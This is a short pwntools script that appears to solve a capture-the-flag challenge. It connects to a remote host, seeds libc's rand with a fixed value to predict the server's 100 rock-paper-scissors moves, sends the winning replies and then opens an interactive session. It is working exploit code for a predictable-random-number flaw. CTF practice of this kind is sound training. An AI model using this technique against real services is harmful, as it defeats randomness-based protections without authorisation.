from pwn import * 
from pwn import p64
import socket
from ctypes import *
context(arch='amd64')
context.terminal = ['tmux', 'splitw', '-h']

elf = cdll.LoadLibrary('libc.so.6')
host = "node.yuzhian.com.cn"
ip = socket.gethostbyname(host)
r = remote(ip,36703)#远程连接

# r = process("./pwn")
r.sendafter(b"(y/n)",b'y')
elf.srand(10)
for i in range(0,100):
    op_re = elf.rand()%3
    if(op_re == 0):
        re = 2
    elif(op_re ==1):
        re = 0
    else:
        re = 1
    r.sendline(str(re))
r.interactive()

